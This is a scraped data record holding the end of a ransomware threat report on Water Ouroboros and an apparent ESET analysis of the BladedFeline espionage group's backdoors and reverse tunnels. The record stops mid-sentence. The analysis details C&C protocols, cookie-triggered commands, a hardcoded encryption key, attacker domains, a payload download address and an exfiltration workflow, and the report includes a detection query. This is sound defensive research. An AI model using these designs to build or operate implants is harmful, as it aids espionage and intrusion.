| T1595.002 - Active Scanning: Vulnerability Scanning T1087 - Account Discovery T1018 - Remote System Discovery T1069.002 - Permission Groups Discovery: Domain Trusts | T1021.001 - Remote Services: Remote Desktop Protocol T1021.002 - Remote Services: SMB/Windows Admin Shares | T1041 - Exfiltration Over Command and Control Channel | T1105 - Ingress Tool Transfer T1071.001 - Application Layer Protocol: Web Protocols | T1486 - Data Encrypted for Impact T1490 - Inhibit System Recovery T1105 - Service Stop | Summary of malware, tools, and exploits used Security teams can look for the presence of the following tools and exploits that are typically used in Water Ouroboros attacks: | ATTACK TOOL | MITRE TTP | |---|---| | SharpRhino | | | Storage Software | Exfiltration | | PCHunter | Discovery, Defense Evasion | | ProcessHacker | Discovery, Defense Evasion | | AdFind | Lateral Movement | Top affected countries, industries, and business sizes The US bore the overwhelming impact of Water Ouroboros attacks, experiencing nearly ten times as many incidents (136) as the next most-targeted country, Canada.\nThe UK, France, Germany, and Italy also ranked among the group's primary targets.\nFigure 6.\nThe distribution of countries (top 10) targeted by the Water Ouroboros Sources: Water Ouroboros leak site data and Trend open-source intelligence (OSINT) research (Oct. 2023- Feb. 2025) Companies in the construction, IT, manufacturing, and healthcare industries experienced the highest number of attacks.\nHowever, Water Ouroboros targeted a wide range of sectors, demonstrating a broad and diverse attack strategy.\nFigure 7.\nA breakdown of the top 10 industries targeted by Water Ouroboros ransomware attacks Sources: Water Ouroboros leak site data and OSINT research (Oct. 2023- Feb. 2025) The threat actor launched attacks against organizations of all sizes but appeared to prefer targeting small and medium-sized businesses (1–200 and 201–1,000 employees, respectively), likely due to their limited cybersecurity resources.\nFigure 8.\nA breakdown of the sizes of the organizations targeted by Water Ouroboros ransomware attacks Sources: Water Ouroboros leak site data and OSINT research (Oct. 2023- Feb. 2025) Trend Vision One™ Trend Vision One™ is a cybersecurity platform that simplifies security and helps enterprises detect and stop threats faster by consolidating multiple security capabilities, enabling greater command of the enterprise’s attack surface, and providing complete visibility into its cyber risk posture.\nThe cloud-based platform leverages AI and threat intelligence from 250 million sensors and 16 threat research centers around the globe to provide comprehensive risk insights, earlier threat detection, and automated risk and threat response options in a single solution.\nTrend Vision One Threat Intelligence To stay ahead of evolving threats, Trend Vision One customers can access a range of Intelligence Reports and Threat Insights within Vision One.\nThreat Insights helps customers stay ahead of cyber threats before they happen and allows them to prepare for emerging threats by offering comprehensive information on threat actors, their malicious activities, and their techniques.\nBy leveraging this intelligence, customers can take proactive steps to protect their environments, mitigate risks, and effectively respond to threats.\nTrend Micro Vision One Intelligence Reports App [IOC Sweeping] - Hunters International (Hive Ransomware Rebranding) - New Ransomware-as-a-Service Group: Hunters International seen in multiple LAR Companies - SharpRhino – New Hunters International RAT Trend Vision One Threat Insights App Hunting queries Trend Vision One Search App Trend Vision One customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment.\nHunters International Ransomware Detection malName:*RUTHENS* AND LogType: detection More hunting queries are available for Trend Vision One customers with Threat Insights Entitlement enabled.\nRecommendations Water Ouroboros, a Ransomware-as-a-Service (RaaS) operation, demonstrates how threat actors can employ existing ransomware infrastructures while introducing new capabilities to evade detection and enhance efficiency.\nDespite being a relatively new group, Water Ouroboros has already targeted multiple industries worldwide, underscoring the persistent and evolving threat posed by ransomware operations.\nThe increasing reliance on vulnerability exploitation as an initial infection vector highlights the importance of timely patching and proactive security measures.\nOrganizations should prioritize securing public-facing applications, as seen in Water Ouroboros’ exploitation of Oracle WebLogic vulnerabilities.\nAdditionally, threat actors are placing greater emphasis on data exfiltration rather than encryption, reinforcing the need for robust data security and incident response strategies.\nTo protect systems against Water Ouroboros and similar ransomware threats, organizations should implement a comprehensive security strategy that systematically allocates resources to establish strong defenses.\nThe following best practices can help mitigate ransomware risks: Audit and inventory - Take an inventory of assets and data - Identify authorized and unauthorized devices and software - Make an audit of event and incident logs Configure and monitor - Manage hardware and software configurations - Grant admin privileges and access only when necessary to an employee’s role - Monitor network ports, protocols, and services - Activate security configurations on network infrastructure devices such as firewalls and routers - Establish a software allow list that only executes legitimate applications Patch and update - Conduct regular vulnerability assessments - Perform patching or virtual patching for operating systems and applications - Update software and applications to their latest versions Protect and recover - Implement data protection, backup, and recovery measures - Enable multifactor authentication (MFA) Secure and defend - Employ sandbox analysis to block malicious emails - Deploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network - Detect early signs of an attack such as the presence of suspicious tools in the system - Use advanced detection technologies such as those powered by AI and machine learning Train and test - Regularly train and assess employees on security skills - Conduct red-team exercises and penetration tests Like it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":64,"metadata":{"source":"blog","platform":"trendmicro","filename":"Water Ouroboros"}}
{"id":201,"title":"BladedFeline: Whispering in the dark","publish_date":"2025-06-05","link":"https://www.welivesecurity.com/en/eset-research/bladedfeline-whispering-dark/","clean_text":"In 2024, ESET researchers discovered several malicious tools in the systems used by Kurdish and Iraqi government officials.\nThe APT group behind the attacks is BladedFeline, an Iranian threat actor that has been active since at least 2017, when it compromised officials within the Kurdistan Regional Government (KRG).\nThis group develops malware for maintaining and expanding access within organizations in Iraq and the KRG.\nWhile this is our first blogpost covering BladedFeline, we discovered the group in 2023, after it targeted Kurdish diplomatic officials with the Shahmaran backdoor, and previously reported on its activities in ESET APT Activity reports Q4 2023-Q1 2024 and Q2 2024-Q3 2024.\nThe array of tools utilized in the recent campaign shows that since deploying Shahmaran, BladedFeline has continued to develop its arsenal.\nWe found two reverse tunnels, a variety of supplementary tools, and most notably, a backdoor that we named Whisper and a malicious IIS module we dubbed PrimeCache.\nWhisper is a backdoor that logs into a compromised webmail account on a Microsoft Exchange server and uses it to communicate with the attackers via email attachments.\nPrimeCache also serves as a backdoor: it is a malicious IIS module related to what we referred to as Group 2 in our 2021 paper Anatomy of native IIS malware.\nSignificantly, PrimeCache also bears similarities to the RDAT backdoor used by the Iran-aligned OilRig APT group.\nBased on these code similarities, as well as on further evidence presented in this blogpost, we assess with medium confidence that BladedFeline is a subgroup of OilRig, an Iran-aligned APT group going after governments and businesses in the Middle East.\nWe have previously reported on other activity linked to OilRig.\nTo avoid confusion, we have since refined our OilRig tracking, and we now track both of those operations under a separate subgroup – Lyceum – within OilRig.\nBladedFeline has worked consistently to maintain illicit access to Kurdish diplomatic officials, while simultaneously exploiting a regional telecommunications provider in Uzbekistan, and developing and maintaining access to officials in the government of Iraq.\nThis blogpost details the technical aspects of the initial implants delivered to BladedFeline’s targets, the links between the victims, and lays the groundwork for associating this subgroup with OilRig.\nKey points of the blogpost: - BladedFeline compromised officials within the Kurdistan Regional Government at least as early as 2017. -\nThe initial implants used there can be traced back to OilRig. -\nWe discovered BladedFeline after its operators compromised Kurdish diplomatic officials with the group’s Shahmaran signature backdoor in 2023. -\nThis APT group has also infiltrated high-ranking officials within the government of Iraq. -\nWe assess with medium confidence that BladedFeline is a subgroup within OilRig. -\nWe analyze two reverse tunnels (Laret and Pinar), a backdoor (Whisper), a malicious IIS module (PrimeCache), and various supplementary tools.\nBladedFeline overview BladedFeline is an Iran-aligned cyberespionage group, active since at least 2017 according to ESET telemetry.\nWe discovered the group in 2023 when it deployed its Shahmaran backdoor against Kurdish diplomatic officials.\nShahmaran, named after a mythical half-snake, half-woman creature from Iranian folklore, is a 64-bit portable executable that we found in the target’s Startup directory.\nThis simple backdoor doesn’t use any compression or encryption for network communications.\nAfter checking in with the C&C server, the backdoor executes any operator commands provided, which include uploading and downloading additional files, requesting specific file attributes and providing file and directory manipulation API.\nAs evidenced by the campaign toolset we describe in this blogpost; since deploying Shahmaran, BladedFeline has continued to develop its malware in order to retain and even further extend its access to the KRG and to high levels within the government of Iraq (GOI).\nWe uncovered the campaign in 2024 after finding BladedFeline’s Whisper backdoor, PrimeCache IIS backdoor, and a set of post-compromise tools in the networks of Kurdish diplomatic officials, Iraqi government officials, and a regional telecommunications provider in Uzbekistan.\nWe detected and collected one version of Whisper and found another on VirusTotal, uploaded by a user in Iraq.\nThey are virtually identical, and we were able to determine the likely identity of the VirusTotal uploader, based on data in the Whisper sample and other samples uploaded under the same submitter ID.\nPrimeCache, Flog (a webshell), and Hawking Listener (an early-stage implant that listens on a specified port) were all uploaded to VirusTotal by the same submitter ID who uploaded the Whisper samples.\nBased on the Whisper link and the close timeframe (both were uploaded within a matter of minutes) we believe it was deployed by BladedFeline to a victim in Iraq’s government.\nSome of the tools mentioned below in the Timeline are discussed later in the report (e.g., Slippery Snakelet).\nTimeline 2017-09-21 ● VideoSRV reverse shell on KRG system | 2018-01-30 ● RDAT backdoor on KRG system | 2019-07-09 ● Custom Plink on KRG system | 2021-05-01 ● Sheep Tunneler on KRG system | 2023-01-23 ● LSASS dumped on KRG system | 2023-02-01 ● Shahmaran backdoor on KRG system | 2023-03-25 ● First victim targeted at a telecommunications company in Uzbekistan | 2023-06-12 ● Shahmaran version 2 on KRG system for access maintenance | 2023-12-14 ● BladedFeline operators executing CLI commands on KRG system | 2023-12-16 ● Slippery Snakelet backdoor on KRG system | 2023-12-20 ● P.S. Olala (a PowerShell executor) on KRG system | 2023-12-20 ● PsExec on KRG system | 2024-01-07 ● Whisper backdoor on KRG system | 2024-02-01 ● Laret reverse tunnel on KRG system | 2024-02-20 ● Pinar reverse tunnel on KRG system | 2024-02-29 ● PrimeCache malicious IIS module uploaded to VirusTotal | 2024-03-11 ● Whisper version 2, Flog, and Hawking Listener uploaded to VirusTotal Attribution Our attribution of this campaign to BladedFeline is based on the following: - The campaign targets members of the KRG, as have previous attacks conducted by BladedFeline. -\nThe original attack activity targeting the KRG organization allowed us to identify successive malware, as BladedFeline has attempted to maintain and expand access to the organization. -\nFurther analysis of the attacks led us to identify the telecommunications victim in Uzbekistan. -\nAt the same time, looking into the Whisper backdoor helped us identify the GOI victim.\nWe assess that BladedFeline is targeting the KRG and the GOI for cyberespionage purposes, with an eye toward maintaining strategic access to high-ranking officials in both governmental entities.\nThe KRG’s diplomatic relationship with Western nations, coupled with the oil reserves in the Kurdistan region, makes it an enticing target for Iran-aligned threat actors to spy on and potentially manipulate.\nIn Iraq, these threat actors are most probably trying to counter the influence of Western governments following the US invasion and occupation of the country.\nWe believe with medium confidence that BladedFeline is a subgroup of OilRig: - As does OilRig, BladedFeline targets organizations in the Middle East with the purpose of cyberespionage. -\nWe have found OilRig tools (VideoSRV and RDAT) in a compromised KRG system. -\nBladedFeline’s malicious IIS module PrimeCache shares code similarities with OilRig’s RDAT.\nBladedFeline is not the only subgroup of OilRig that we are monitoring: we have already been tracking Lyceum, also known as HEXANE or Storm-0133, as another OilRig subgroup.\nLyceum focuses on targeting various Israeli organizations, including governmental and local governmental entities and organizations in healthcare.\nMajor tools we attribute to Lyceum include DanBot, the Shark, Milan, and Marlin backdoors, Solar and Mango, OilForceGTX, and a variety of downloaders using legitimate cloud services for C&C communication.\nWe will continue to use the name OilRig to refer to the parent group, also known as APT34 or Hazel Sandstorm (formerly EUROPIUM).\nOilRig is a cyberespionage group that has been active since at least 2014 and is commonly believed to be based in Iran.\nThe group targets Middle Eastern governments and a variety of business verticals, including chemical, energy, finance, and telecommunications.\nNotable OilRig campaigns include the 2018 and 2019 DNSpionage campaign, targeting victims in Lebanon and the United Arab Emirates; the 2019–2020 HardPass campaign, using LinkedIn to target Middle Eastern victims in the energy and government sectors; the 2020 attack against a telecommunications organization in the Middle East using the RDAT backdoor; and the 2023 attacks targeting organizations in the Middle East with the PowerExchange and MrPerfectionManager backdoors.\nOilRig tools used by BladedFeline We have found two OilRig tools on the KRG machines compromised by BladedFeline.\nRDAT We discovered a previously unreported version of the OilRig backdoor RDAT on two KRG victim systems.\nAnalyzing RDAT, we found that the operational flow (see Unit 42’s report for specifics), compilation timestamp (2017-12-26 10:49:35), and file write time (2018-01-30) align with OilRig activity and targeting, particularly with regard to the group’s 2017 activity.\nWe observed a file with an SHA-1 of 562E1678EC8FDC1D83A3F73EB511A6DDA08F3B3D and a path of C:\\Windows\\System32\\LogonUl.exe on both systems.\nThe PDB path also corroborates that this binary is RDAT: C:\\Users\\Void\\Desktop\\RDAT\\client\\x64\\Release\\client.pdb.\nTo date, we have only ever observed RDAT in use by OilRig.\nMoreover, we have not seen any custom implant sharing between OilRig and other Middle Eastern groups, and it seldom occurs between Iran-aligned threat actors.\nFurther bolstering the case that BladedFeline is an OilRig subgroup, as with Lyceum, is the analysis linking RDAT with PrimeCache, a malicious IIS module that was uploaded to VirusTotal presumably by the GOI victim.\nThis link is explored in more depth in the Links with OilRig section of the blogpost.\nVideoSRV One additional data point on the OilRig and BladedFeline connection is a reverse shell deployed to one of the KRG victims (September 21st, 2017) prior to RDAT getting dropped on the same system (January 30th, 2018).\nVideoSRV (SHA-1: BE0AD25B7B48347984908175404996531CFD74B7), so named for its filename videosrv.exe, has the PDB string C:\\Users\\v0id\\Desktop\\reverseShell\\clientProxy\\x64\\Release\\ConsoleApplication1.pdb, which bears some similarities to the RDAT PDB string C:\\Users\\Void\\Desktop\\RDAT\\client\\x64\\Release\\client.pdb.\nTechnical analysis Initial access It is still unclear how BladedFeline is developing access to its victims.\nWhat we know is that in the case of the KRG victims, the threat actors obtained access at least as far back as 2017 and have maintained it ever since.\nAs for the GOI victims, we suspect that the group exploited a vulnerability in an application on an internet-facing web server, which allowed them to deploy the Flog webshell.\nToolset PrimeCache – malicious IIS module PrimeCache, whose name we derived from the RTTI AVRSAPrimeSelector and its filename (cachehttp.dll), is a passive backdoor implemented as a native IIS module with an internal name of HttpModule.dll.\nIt was uploaded to VirusTotal by the same user who uploaded one of the Whisper backdoor samples.\nIt is a 64-bit C++ DLL with a compilation timestamp of 2023-05-14 06:55:52 and has a minimized PDB string of just HttpModule.pdb.\nIt has a single export: RegisterModule.\nPrimeCache is a successor to a collection of unattributed IIS backdoors that we have previously reported as Group 2 (simple IIS backdoors) in our 2021 blogpost, Anatomy of native IIS malware.\nWe obtained those original samples from VirusTotal where they were uploaded by users from Bahrain, Israel, and Pakistan, between 2018 and 2020.\nBased solely on the location of the presumed victims, it is possible that those cases were also related to BladedFeline – or, more broadly, OilRig – activities.\nMain functionality PrimeCache’s main functionality is implemented in the CGlobalModule::OnGlobalPreBeginRequest handler.\nThis is a unique implementation, differing from its predecessors, which used the CHttpModule::OnBeginRequest handler.\nPrimeCache filters incoming HTTP requests, only processing those from the BladedFeline operators, which are recognized by having a cookie header with the structure: F= Note that this value can be standalone or embedded into a longer cookie, surrounded by semicolon (;) characters.\nThe backdoor works in an unusual way (new with this version as compared with our 2021 analysis).\nRather than accepting a backdoor command and all its parameters within a single HTTP request, each action is split into multiple requests.\nFirst, the BladedFeline operator sends an individual request for each single parameter; these parameters are stored in a global structure.\nThen the operator sends another request to trigger the backdoor command.\nFinally, PrimeCache uses the previously received parameters to execute the specified action, and then clears the cached parameters.\nOperator commands There are three types of requests that can be received by the backdoor, as shown in Table 1.\nTable 1.\nPrimeCache operator commands | Parameter | Description | | | 1 | Format: | Clears the list of previously stored parameters and adds the new value.\nMost parameters are encrypted; see Encryption below.\n| | 0 | Not used.\n| Triggers the backdoor action, using previously transmitted backdoor parameters.\n| | Other | Format: | Adds the specified value to the list of stored parameters (doesn’t clear the list).\nMost parameters are encrypted; see Encryption below.\n| Once the action is triggered (via The PrimeCache action is operator command (OpCom) a, the session key is OpCom k, binary data is OpCom b, and the filename is OpCom f. Table 2.\nPrimeCache post-operator command actions | PrimeCache action | Session key | Binary data | Filename | Command description | Return value | | r | RSA-encrypted session key | AES-encrypted command line | Null | Runs the specified command via popen.\n| Command output | | r2 | Runs the specified command via CreateProcessW. | |||| | r3 | (Presumably) runs the specified command by sending it to another (unknown) process via the named pipe \\\\.\\pipe\\iis, then reads (presumably) the command output from the same pipe.\n| |||| | u | AES-encrypted file content | Local filename | Creates a local file with the specified name and content.\n| OK | | | d | Null | Exfiltrates the given file from the compromised IIS server.\n| File content | Encryption Similar to its predecessors, PrimeCache uses both RSA and AES-CBC for its C&C communication.\nThe parameters and the return values are always AES-CBC encrypted using the session key, then base64 encoded.\nThe session key is RSA encrypted; the backdoor has a hardcoded private and public RSA key (not a pair) to handle both directions of the communication.\nA statically linked Crypto++ library is used to handle the encryption and decryption operations.\nC&C communications Operator commands are transmitted in the cookie header (another deviation from earlier versions, which used the URL or the HTTP request body).\nPrimeCache responses are added to the HTTP response body.\nIf a file is being exfiltrated, the Content-Type header is set to attachment, matching the functionality of the previous versions.\nThe PrimeCache predecessors also used the same encryption scheme, and similar parameter names (a, c, f, k), but all were sent to the backdoor in a single request.\nThe only supported commands were r, u, and d. Links with OilRig When we compare PrimeCache with RDAT, as described in the RDAT attribution subsection, we see several similarities that support our supposition that BladedFeline is a subgroup of OilRig. -\nBoth RDAT and PrimeCache use the Crypto++ library, and both parse the backdoor commands using the regular expression [^,]+. -\nThe payload attempts to parse the decrypted cleartext using the regular expression [^,]+ to get the command value and the command arguments that are split with a comma. -\nBoth share a function, shown in Figure 1, that executes a shell command and reads the output, which, across our corpus, is found only in these two pieces of malware.\nWhisper backdoor Whisper is a 32-bit Windows binary written in C#/.NET, named after its PDB strings G:\\csharp\\Whisper_Trojan_winform\\Whisper_Trojan_winform\\Whisper_Trojan_winform\\obj\\Release\\Veaty.pdb and Z:\\csharp\\Whisper_Trojan_winform_for_release\\Whisper_Trojan_winform\\Whisper_Trojan_winform\\obj\\Release\\Veaty.pdb.\nIt uses a Microsoft Exchange server to communicate with the attackers by sending email attachments via a compromised webmail account.\nWe have seen two versions of the backdoor: we detected and collected one version, and was uploaded to VirusTotal from Iraq.\nThese samples are virtually identical, but we were able to determine the likely identity of the VirusTotal uploader based on data in the Whisper sample and other samples uploaded by that user.\nBoth these versions of Whisper have timestomped compilation timestamps (2090-04-11 23:38:14 and 2080-12-11 03:50:47).\nThey are built using Costura, presumably to ensure that the victim’s system uses the DLLs packaged with the binary and not DLLs in the Global Assembly Cache.\nWhisper’s operation is not the first time we have observed an OilRig subgroup using cloud services for its C&C protocol.\nWhile, unlike with Whisper, there were no emails actually being sent, Lyceum used email drafts for communication between its malware and operators throughout 2022, as we described in a previous blogpost.\nOperational workflow Whisper does not require or accept any arguments.\nInstead, its dropper – which we dubbed Whisper Protocol after its filename, Protocol.pdf.exe – writes its configuration file to disk alongside it (see the Whisper Protocol section).\nThe config file, shown in Figure 2, is in XML format with its key and value strings base64 encoded.\nIt is called by the Specs class of Whisper, which uses a function – DelockItems – to base64 decode the config variables.\nFigure 3 shows the operational flow of Whisper, which we detail in the following paragraphs.\nWhisper’s operational flow can be broken down into seven steps: In Step 1, Whisper uses the credentials from the config file (line 15 in Figure 2) and the Microsoft Exchange Web Services class ExchangeService to attempt to log into compromised webmail accounts.\nOnce Whisper successfully logs into an account, it saves the credentials in memory and writes the following to the log file c:\\Windows\\Temp\\WindowsEventLogs.txt: ------------ ItemContext is set: username [ If no credentials in the config file are valid, Whisper logs the following error messages to the log file: ---------------------------------- there was No Way to access any MailBox. __________\nExtraction function is called.\nIf an unexpected error is caught, Whisper writes the following to the log file (note the misspelling of the word happened, indicative of a non-native English speaker) and exits using the Environment.\nExit(Int32) method.\nStrangely, the exitCode used, 0, indicates that the process completed successfully. ----------------------------------__\nan unknown Exception happend.\nprogram turned off Next, in Step 2, Whisper uses the credentials from the previous step to check for inbox rules using the ExchangeService.\nGetInboxRules method (which [r]etrieves a collection of Inbox rules that are associated with the specified user).\nUsing the value in line 13 of the configuration file (key=\"receive_sign\", value=\"PMO\"), Whisper iterates over the inbox rules looking for that value to be specified in one of three places: subject, body, or subjectorbody and for emails matching that value to be sent to a specified location (deleteditems or inbox, depending on the version of Whisper).\nIf the inbox has such a rule, Whisper goes to the next step; otherwise, Whisper creates a rule with the given parameters: - Rule name: MicosoftDefaultRules. -\nMove to folder: deleteditems or inbox. -\nOne version of Whisper specifies the deleteditems folder; the other points to the inbox.\nBoth are hardcoded in the separate binaries. -\nMark as read: true. -\nCondition: subject contains PMO. -\nThe location to look for the string, subject, is hardcoded in both versions of Whisper.\nThe string to look for, PMO, is in the configuration file used by Whisper; we were unable to collect the other configuration file.\nIn Step 3, Whisper initiates a never-ending do loop that sends a check-in email message from the compromised email account in Step 1 to an email address specified in the configuration file (line 16, key=\"alive_mail\").\nThe check-in message is sent every 10 hours (line 10 in the configuration file, key=\"al_time\"; in minutes), the subject (line 17, key=\"alive_msg_subj\") is Content, and the message body contains the string defined below: \"Content ID: \" + base64_encode(\"COMPUTERNAME:USERDNSDOMAIN:USERNAME\") Next, in Step 4, Whisper fetches operator commands.\nIt does so by searching the inbox identified in Step 1 for files in a given folder (deleteditems or inbox, depending on the version of Whisper) with attachments where the subject matches a string (supplied in the configuration file; PMO in the only configuration file we collected).\nFor matching emails with attachments, Whisper scrapes the attachment body (which should contain encrypted commands) and stores the sender’s email address for use later as the C&C server to which operator command results are uploaded.\nIn Step 5, Whisper decrypts the operator commands.\nIt does so by first base64 decoding the string containing the command and then decrypting the result using the .NET AES class with a 16-byte initialization vector and the encryption key found in the configuration file (line 18, key=\"enc_key\" value=\"cXdlcmFzZHp4Y3ZmZ2d0aGhsZGZvZ2g/bHZtZ2xrZyE=\").\nDecrypted commands are in the form of base64-encoded( Then, in Step 6, Whisper executes the backdoor commands and records the results.\nPossible commands include: - Write a file to disk The data written to disk is: this is my file content The bytes to write are base64 encoded (and decoded before writing to disk).\nSuccessful execution returns: file received properly.\nwrote to: - Send a file to the C&C server This command is prefixed with this is my required file path followed by \\n this is my required file - Execute a PowerShell script This command does not have a prefix and instead only contains a plaintext command that PowerShell is capable of executing, postfixed with a pipe after which Whisper appends Out-String.\nOutput is saved in this form: base64-encoded( Finally, in Step 7, Whisper sends the command output in an email message to the C&C inbox found in Step 4.\nThe email is formatted with these particulars: - sending email address: inbox from Step 1, - recipient: email address from Step 4, - subject: Email (from the configuration file, line 14, key=\"send_sign\"), - message body: Hey There!\nfind your results in the attachment (hardcoded in the binary), and - attachment: output from the commands in Step 6, encrypted with the same encryption key in Step 5 (configuration file line 18, key=\"enc_key\" value=\"cXdlcmFzZHp4Y3ZmZ2d0aGhsZGZvZ2g/bHZtZ2xrZyE=\").\nSteps 4–7 continue in a loop using the same check-in schedule from Step 3 until the credentials hardcoded in the configuration file are changed.\nShahmaran backdoor The Shahmaran backdoor, named after a mythical half-snake, half-woman creature from Iranian folklore, is a 64-bit PE that was found in the startup folder as: %ROAMINGAPPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobeupdater.exe At system startup, Shahmaran creates a Windows event object, SysPrep.\nIt is possible that the Shahmaran developers chose SysPrep as the event name to blend into the background noise, as SysPrep is part of the Windows imaging process.\nWindows admins use it to create a standard Windows image (often referred to as a Gold or Golden image) before deployment to enterprise systems.\nFigure 4 shows the SysPrep event object on a compromised system as seen by Sysinternals’ WinObj.\nThe C&C domain is hardcoded, olinpa[.]com, as is the port, 80, and the User-Agent string, of which there are two.\nThe initial connection to the C&C uses an incomplete User-Agent string (it is missing the closing parenthesis): Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0 Subsequent communication with the C&C uses the corrected User-Agent string: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Shahmaran does not use any compression or encryption for network communications.\nAnd while the port is hardcoded (80), there are code fragments that check for the port in use and update communication variables if port 443 is used.\nAfter checking in with the C&C server, Shahmaran executes any operator commands provided, returns any output from those commands, then sleeps for 30 seconds before checking in with the C&C server again, ad infinitum.\nTable 3 shows the available operator commands and their functions.\nTable 3.\nOperator commands and their descriptions | Operator command | Description | | 1 | Returns the datetime that the specified file was written to disk in UTC, prepended with id= and in the format YYYY/MM/DD HH:MM:SS.\n| | 2 | Moves the specified file to the specified location.\nReturns the output of the file move operation prepended with id=. | | 3 | Deletes the specified file.\nReturns the output of the file delete operation prepended with id=. | | 4 | Creates the specified directory.\nReturns the output of the directory creation operation prepended with id=. | | 5 | Creates a log file in the hardcoded location c:\\programdata\\~tmp.log, if it does not already exist.\nIf the file already exists, reads the contents and returns them to the C&C server with the file’s timestamp in UTC and in the format YYYY/MM/DD HH:MM:SS, then deletes the file.\nIf the file does not exist, returns the filename and path.\nIf an error occurs, returns the error.\nAll returned data is prepended with s=. | | 6 | Checks for the specified file.\nIf found, writes the provided data to the file and returns s= | | 7 | Creates the specified file.\nReturns s= appended with either the filename (success) or an error code.\n| | 8 | Checks for the presence of the specified filename in a compressed folder in the specified location on disk and creates it if it does not exist.\nReturns s= appended with the filename and the timestamp in UTC in the format YYYY/MM/DD HH:MM:SS.\nThe timestamp is used to determine whether the file was already present or was just created.\n| After executing an operator command, Shahmaran sends the output to the C&C server using the format t= Slippery Snakelet backdoor Slippery Snakelet is a small Python-based backdoor with limited capabilities: 1.\nexecutes a command via cmd.exe, 2.\ndownloads a file from a URL, and 3.\nupload a file to the /newfile/ URI path.\nSlippery Snakelet has a hardcoded C&C server, zaincell[.]store, and communicates with it via URLs of the form https://zaincell[.]store/request/ Slippery Snakelet also has this hardcoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 The C&C server was disguised as an Arabian Gulf E-Learning site and the default HTML landing page does not contain any commands.\nWhen Slippery Snakelet supplies a correctly formatted request (e.g., https://zaincell[.]store/request/ tags such as 6wjTyB3Y20KSzU1VUlTagp3aG9hbWkKbnVsbApudWxs into the page, and Slippery Snakelet collects and decodes these.\nSlippery Snakelet base64 decodes everything from the eighth character to the end of the string (i.e., Y20KSzU1VUlTagp3aG9hbWkKbnVsbApudWxs in the example above).\nThe decoded output is newline separated and contains the five items described in Table 4 Table 4.\nSlippery Snakelet arguments and options | Commands | Options | Example | | Command Type | cm (execute cmd.exe command) getfl (download a file) sendfl (upload a file) | cm | | Command ID | CMID (a random string) | K55UISj | | Command | FileUrl | FilePath | Respectively for cm | getfl | sendfl | whoami | | Null | SavePath | FilePath | Respectively for cm | getfl | sendfl | null | | Null | Unknown | null | Laret and Pinar – reverse tunnels Laret and Pinar, whose names are derived from the internal names in each respective file, are 32-bit Windows binaries written in C#/.NET.\nBoth have timestomped PE compilation timestamps – a tactic that is common amongst Middle Eastern (and particularly Iran-nexus) threat groups – of 2058-02-07 00:12:48 and 2072-07-10 18:26:15, respectively.\nBoth were found on two systems at the locations in Table 5.\nTable 5.\nLocations of Laret and Pinar on disk, along with filenames | Reverse tunnel | Location | | Laret | %APPDATA%\\Local\\LEAP Desktop\\LEAPForm.exe | | Pinar | C:\\Program Files\\LEAP Office\\SystemMain.exe | | C:\\Program Files\\LEAP Office\\winhttpproxy.exe | In the case where we do not have a location on disk for Laret but we do have the filename (wincapsrv.exe), we could see that Laret was downloaded from http://178.209.51[.]61:8000/wincapsrv.exe via PowerShell.\nUnfortunately, we did not manage to discover where it was written to disk.\nAttempts to enumerate the IP and download the file were rebuffed by the C&C server, likely indicating that some form of compromised host identification is required in the connection setup (which we do not have).\nRegarding writing to disk, BladedFeline operators likely timestomped the file creation date of Pinar to 2017-09-14 14:56:00 on one of the two compromised systems.\nHow the file creation date was timestomped is an open question, but it shows that the attackers have compromised these two systems to such an extent that they probably have administrative rights.\nAt runtime, both Laret and Pinar rely on a configuration file in the same directory as their binaries for eight required variables, which are listed in Table 6.\nTable 6.\nLaret and Pinar configuration parameters with default hardcoded values | Field | Description | Default value | | ssh_host | C&C IP address.\n| N/A | | ssh_port | 22 | | | ssh_username | C&C username.\n| N/A | | ssh_pass | C&C password.\n| N/A | | local_port | 9666 | | | process_file | File to execute before executing any reverse tunnel actions.\n| N/A | | wait_time_minutes | Time to wait between check-ins with the C&C server.\n| 10f (271) | | remote_port | Port number used for port forwarding.\n| 1234 | We have thus far not collected the configuration file but have reconstructed its likely content, found in Figure 5, based on code analysis.\nReading from the configuration file is done by base64 decoding the encoded string to bytes, which results in strings of space-delimited, hexadecimal-encoded character values, which in turn are decoded into ASCII strings.\nThe BladedFeline developers refer to this as Delocking and the opposite (writing to the configuration file) as Enlocking.\nThis probably indicates a passing familiarity with English, but the developers were far from proficient.\nOther examples of weak translation skills include: - time Alapsed and client not connected - aerpoo after - Waiting connection ... - error in creaate ssh client Interestingly, at another point in the reverse tunnels, the developers correctly spelled the word elapsed (time elapsed!),\nwhich is indicative of poor coding and lax code review, if any is performed (e.g., there is a lot of command result text output to the command line, as if the reverse tunnels were shipped immediately after successful testing was completed).\nThe actual function and flow of Laret and Pinar after collecting the parameters from the configuration file is quite banal, but that is probably an intentional effort to blend in.\nBoth look for a filename in the process_file parameter and, if a file matching the supplied name is present, execute it and start two threads: - Sets up an SSH connection to the C&C IP in the configuration file using the Core.\nRenci.\nSshNet DLL included within the binary.\nPort 22 is hardcoded as the C&C port and port forwarding is also enabled, using the remote_port variable from the configuration file. -\nSets up a listener on the port specified in the local_port parameter of the configuration file.\nNote that any data sent to the listener is done in the clear (i.e., no encryption or obfuscation is used beyond extra \\0 characters that are removed at the time of receipt by Laret and Pinar).\nIf no file is specified in process_file, both Laret and Pinar skip setting up a listener port.\nLaret and Pinar only differ significantly in that Pinar sets up a service, called Service1, for persistence prior to executing the two threads.\nLaret has no means of persistence beyond its process running indefinitely.\nSupplementary tools Flog webshell Flog is a webshell found uploaded to VirusTotal from Iraq by the same submitter who uploaded one of the versions of Whisper.\nBased on that and the close timeframe (both were uploaded within a matter of minutes) we 